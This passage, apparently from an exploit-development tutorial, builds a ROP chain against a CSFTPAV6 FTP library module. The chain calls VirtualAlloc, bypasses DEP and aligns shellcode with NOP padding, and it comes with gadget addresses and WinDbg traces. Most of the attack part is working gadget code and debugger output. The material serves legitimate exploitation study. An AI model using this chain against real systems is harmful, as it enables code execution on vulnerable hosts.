# There are not direct pop esp gadgets or similar.  
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn  
rop += pack("<L", (0x42424242)) # junk  
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0xffffffe8)) # negative offset value  
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret  
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret  
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
```
Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes (same as substracting 0x18 bytes).
Note that we put ESP **before the VirtualAlloc address as we end doing a POP EBP gadget**.
**Note: In this case we reused a value that was in the stack so we pointed EBP 4 bytes higher and we made a pop instruction so ESP is decremented and EBP takes such value. We cant do the strategy of putting other value as the next in the gadget chain as we are doing a mov esp, which means that esp is not going to point anymore to our rop gadget! remember that moving ESP means that we lose control of our gadgets. So we have to do the offset-4**

Now, we can put a breakpoint on any of the latest gadgets we added. 
**Note: as the gadget has been used several times, and we know EAX value is 0x40 after patching flProtect, we can set a conditional breakpoint to stop on that gadget address if EAX is 0x40:**
```c
bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
```

We can see that we stop just after patching flProtect:
```c
0:079> g
eax=00000040 ebx=05e4b220 ecx=7f7f7fc0 edx=77182da0 esi=00fce304 edi=00000000
eip=5050118e esp=00fce40c ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6+0x118e:
5050118e 8bc6            mov     eax,esi
```

Let's execute the ROP chain and see where ESP points to:
```c
0:004> p
eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000
eip=50533cbf esp=026ce424 ebp=026ce2ec iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0x22e21:
50533cbf 8be5            mov     esp,ebp
0:004> p
eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000
eip=50533cc1 esp=026ce2ec ebp=026ce2ec iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0x22e23:
50533cc1 5d              pop     ebp
0:004> dd esp
026ce2ec  41414141 76a65680 026ce504 026ce504
```

We can see that the last pop ebp gadget we put is going to pop 41414141 (one of the dummy values we have inserted to reach EIP) into ebp and then esp is going to point to our desired address.:
```c
0:004> dd esp L1
026ce2f0  76a65680
0:004> p
eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000
eip=76a65680 esp=026ce2f4 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
KERNEL32!VirtualAllocStub:
76a65680 8bff            mov     edi,edi
```

Now let's see our shellcode address (top of stack, we are going to return to it after VirtualAlloc, remember we placed it on purpose). Let's see the protections:
```c
0:055> dd esp
01a0e2f4  01a0e504 01a0e504 00000001 00001000
0:055> !vprot 01a0e504 
BaseAddress:       01a0e000
AllocationBase:    01970000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00062000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
```
Let's execute VirtualProtect and see the protections again (we use pt here to stop until next return).
```c
0:055> pt
eax=01a0e000 ebx=05d4a7e8 ecx=01a0e2c4 edx=77182da0 esi=42424242 edi=00000000
eip=755ddf31 esp=01a0e2f4 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x51:
755ddf31 c21000          ret     10h
0:055> !vprot 01a0e504 
BaseAddress:       01a0e000
AllocationBase:    01970000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
```
Before executing the API, we find that the memory protection is PAGE_READWRITE. But after executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE.

# Aligning the shellcode with our return address
The final step is to align our shellcode with the return address. 
Note: Instead of modifying the offsets used in the ROP chain (would be another method, once we know the offset, modify it) we could also insert several padding bytes before the shellcode. 
We will do the second approach here.

To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the **address of the first instruction we are executing on the stack.** 
Next, we dump the contents of the stack and **obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.**
We are basically forcing our shellcode to be in the address that we previously inserted in the ROP gadget chain. We just calculate the bytes that are missing from such address and add NOPs so that the shellcode starts in such address instead of just after the ROP chain.
**Note: In Windows, the calling convention enforces that the called function decrements ESP to clear the stack arguments.** In Linux, the caller function clears the argument after the flow its returned to it (with add esp, 8). Basically, windows does the "add esp" in the ret.
En español para que quede más claro: Al setear ESP con el dummy address que hemos puesto en el rop chain, ESP está muy abajo (o arriba) de nuestro shellcode. Nuestro shellcode en realidad está mas arriba (o abajo) de la pila. Hay que ver la diferencia en bytes y añadir NOPs para que la dirección de salto que hemos puesto en la ROP chain coincida justo donde empieza nuestro shellcode.

Let's see where we landed after executing VirtualAlloc:
```c
0:055> p
eax=01a0e000 ebx=05d4a7e8 ecx=01a0e2c4 edx=77182da0 esi=42424242 edi=00000000
eip=01a0e504 esp=01a0e308 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01a0e504 43              inc     ebx
```
eip = 0x01a0e504.
We can subtly see as the next instruction to execute is "43" meaning that we are jumping "inside" our shellcode. We have to jump to the start.

Let's see where does our ROP chain start:
```c
0:055> dd esp + 100
01a0e408  5050118e 42424242 505115a3 ffffffe8
01a0e418  5051579a 5051571f 50533cbf 43434343

0:055> db 01a0e424
01a0e424  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
```

Our shellcode starts in 0x01a0e424. Let's calculate the offset from EIP:
```
0:055> ? 0x01a0e424 - 0x01a0e504
Evaluate expression: -224 = ffffff20
```
This means that we have to add 224 NOPs into our shellcode so the first starting byte is at address 0x01a0e504.
Our buffer starts fulfilling at 0x01a0e424, we will fill 224 nops and then the useful payload.
**Note: the offset dummy value that we store in the stack must not be very big as it is better to have a small offset and then fix by adding NOPs in our shellcode rather than jumping further than our shellcode. The offset must be inside our shellcode, that's for sure, so we can put nops and fix it afterwards. If not, we have to change the offset manually.**

After sending the payload with the exact offset, we can see that EIP points to exactly our shellcode:
```c
0:004> dds eip
024de504  cccccccc
0:004> dds eip - 1
024de503  cccccc43
```
**Note: the instruction CC (int 3, software breakpoint) has been executed in order to verify that everything works.**
